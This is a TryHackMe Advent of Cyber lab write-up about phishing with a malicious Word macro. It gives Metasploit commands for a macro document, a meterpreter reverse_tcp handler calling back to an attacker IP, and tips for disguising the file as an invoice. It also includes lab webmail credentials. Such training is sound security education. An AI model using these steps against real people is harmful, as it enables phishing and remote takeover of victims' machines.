# **Tutorial: Room - [Advent of Cyber 2024 - Day 10]**

## 📖 Description
In this room, the objective was to exploit a vulnerability in a Microsoft Word document containing a malicious macro. We used Metasploit to set up a reverse shell, which allowed us to remotely access the victim's machine and capture the flag.

---

### **Learning Objectives**
- Understand how phishing attacks work.
- Discover how macros in documents can be used and abused.
- Learn how to carry out a phishing attack with a macro.

---

### **Phishing Attacks**
Security is only as strong as the weakest link in the chain. Many would argue that humans are often the weakest link in security. Is it easier to exploit a patched system behind a firewall, or to convince a user to open an "important" document? This is why "human hacking," or social engineering, is often the easiest route to compromise a system.

Phishing, a form of social engineering, works by sending "bait" to a large group of target users. The attacker often crafts the message with a sense of urgency, prompting the target to take immediate action, which increases the chances of success. The goal is to steal personal information or install malware by convincing the user to open a file, fill out a form, or click a link.

An example might be an email claiming that a large charge is pending, urging the recipient to check the attached document or URL. The attacker just needs the target to open the file or click the link, triggering actions that allow them to control the victim's system.

---

### **Macros**
Macros are used to automate repetitive tasks, such as inserting text or performing calculations. Microsoft Office products like Word support macros, which can be a huge time-saver for users. However, these macros can also be hijacked and used for malicious purposes in cyber attacks.

In the case of phishing, an attacker can create a document with a macro that, once opened, executes a payload on the victim's system, giving the attacker remote control.

---

### **Attack Plan**
The attacker, Mayor Malware, needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the attacker’s machine, giving them remote control. The steps are as follows:

1. Create a document with a malicious macro.
2. Start listening for incoming connections on the attacker’s system.
3. Send the malicious document and wait for the victim to open it.
4. The victim opens the document and connects to the attacker’s system.
5. The attacker gains control of the victim’s system.

---

## 🛠️ Prerequisites
- Active account on [TryHackMe](https://tryhackme.com)
- Basic knowledge of Metasploit and social engineering attacks.
- Tools required:
  - [Metasploit](https://metasploit.help.rapid7.com/docs/using-metasploit)
  - [Email client to send the malicious file using RainLoop]

---

## 🚀 Step-by-Step Guide

### 1️⃣ Initial Setup in Metasploit
First, we need to configure the Metasploit payload. We’ll use a `windows/meterpreter/reverse_tcp` payload to receive a reverse connection from the victim's machine.

```bash
msfconsole
set payload windows/meterpreter/reverse_tcp
use exploit/multi/fileformat/office_word_macro
set LHOST [ATTACKERS_IP]
set LPORT 8888
show options
exploit
```

### 2️⃣ Exploiting the Malicious Document
After setting up the exploit, we need to generate the malicious Word file with a macro and send it to the victim. Once the victim opens the file, the reverse shell will be triggered, establishing the connection.

---

### 3️⃣ Sending the Malicious Document via Email
To send the malicious document, we will use RainLoop, a webmail client available on the attacker's machine. You can access it by visiting the provided link on the AttackBox.

- **Link for accessing RainLoop**: [Link to RainLoop webmail client]
- **Login credentials**:
  - **Email**: `info@socnas.thm`
  - **Password**: `MerryPhishMas!`

Once logged in, compose an email to the victim (`marta@socmas.thm`). Attach the malicious Word file (renaming it to something convincing like `invoice.docm` or `receipt.docm`), and craft a message to encourage the victim to open it. For example, mention that it contains an important invoice or document that requires their attention.

---

### 4️⃣ Handling the Connection in Metasploit
After the victim opens the malicious file, the reverse connection is made. We configure Metasploit to listen for incoming connections.

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [ATTACKERS_IP]
set LPORT 8888
show options
exploit
```

### 5️⃣ Gaining Access to the Victim's Machine
Once the victim opens the document and runs the macro, we gain access to their system via the reverse shell. Now we can execute commands on their machine.

---

### 6️⃣ Capturing the Flag
With access to the victim’s machine, we navigate to the desktop and read the flag file.

```bash
cd c:/users/Administrator/Desktop
ls
cat flag.txt
```

### 7️⃣ Conclusion
By running the cat flag.txt command, we successfully obtain the flag, completing the room. Congratulations!

### 🖼️ Resources
(Include screenshots or useful links here.)

### 📌 Final Notes
This exercise demonstrated how to perform a phishing attack using a malicious macro to gain remote access to a system and exfiltrate information.

### 🏆 Final Outcome
After completing all the steps and capturing the flag, the room is finished.
